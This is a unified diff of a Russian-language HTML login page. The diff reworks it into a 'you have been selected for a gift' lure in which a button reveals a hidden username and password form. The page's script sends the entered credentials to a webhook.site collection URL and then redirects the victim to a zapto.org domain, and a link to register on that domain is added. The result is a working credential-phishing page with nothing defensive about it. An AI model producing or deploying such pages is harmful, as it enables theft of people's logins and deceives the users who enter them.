@@ -2,40 +2,46 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Вход в систему</title>
+  <title>Подарок за вход</title>
   <style>
     body {
       font-family: sans-serif;
       background-color: #f4f8fb;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       height: 100vh;
     }
-
+    .gift-box {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .gift-box button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #2ecc71;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
     .login-box {
       background: white;
-      padding: 40px;
+      padding: 30px;
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       width: 300px;
+      display: none;
     }
-
-    h1 {
-      text-align: center;
-      margin-bottom: 24px;
-      color: #2c3e50;
-    }
-
-    input {
+    .login-box input {
       width: 100%;
       padding: 10px;
       margin-bottom: 12px;
       border: 1px solid #ccc;
       border-radius: 6px;
     }
-
-    button {
+    .login-box button {
       width: 100%;
       padding: 10px;
       background-color: #3498db;
@@ -44,20 +50,34 @@
       border-radius: 6px;
       cursor: pointer;
     }
-
-    button:hover {
+    .login-box button:hover {
       background-color: #2980b9;
+    }
+    .login-box a {
+      font-size: 14px;
+      text-align: center;
+      display: block;
+      margin-top: 10px;
+      color: #2c3e50;
     }
   </style>
 </head>
 <body>
+
+  <div class="gift-box">
+    <h2>🎁 Поздравляем!</h2>
+    <p>Вы были выбраны для получения подарка</p>
+    <button onclick="document.querySelector('.login-box').style.display='block'; this.style.display='none';">Забрать подарок</button>
+  </div>
+
   <div class="login-box">
-    <h1>Авторизация</h1>
+    <h3>Вход в систему</h3>
     <form id="loginForm">
       <input type="text" id="username" placeholder="Логин" required>
       <input type="password" id="password" placeholder="Пароль" required>
-      <button type="submit">Войти</button>
+      <button type="submit">Войти и получить 🎁</button>
     </form>
+    <a href="https://kazcyber.zapto.org/register.php">Нет аккаунта? Зарегистрироваться</a>
   </div>
 
   <script>
@@ -71,9 +91,7 @@
 
       fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           username: username,
           password: password,
@@ -85,9 +103,6 @@
       window.location.href = "https://kazcyber.zapto.org/";
     });
   </script>
+
 </body>
 </html>
-
-
-
-
